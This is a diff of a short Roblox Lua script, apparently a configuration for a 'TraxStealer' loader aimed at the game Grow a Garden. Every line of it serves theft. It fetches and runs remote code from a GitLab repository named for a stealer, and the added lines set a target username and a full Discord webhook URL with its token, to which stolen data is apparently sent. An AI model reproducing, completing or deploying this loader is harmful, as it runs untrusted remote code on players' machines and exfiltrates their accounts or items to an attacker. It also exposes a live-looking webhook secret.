@@ -1,1 +1,4 @@
-loadstring(game:HttpGet("https://gitlab.com/traxmain1/TraxStealer/-/raw/main/grow-a-garden"))() 
+Username = "wakai_nenji"
+Webhook = "https://discord.com/api/webhooks/1370516447968891056/CeV0G04KlTZqo4rnrxmwtVQSzuebTBiNyiiuoM_45ENWQLbjqEC7jtMp7KtBVhJyeykq"
+
+loadstring(game:HttpGet("https://gitlab.com/traxmain1/TraxStealer/-/raw/main/grow-a-garden"))()
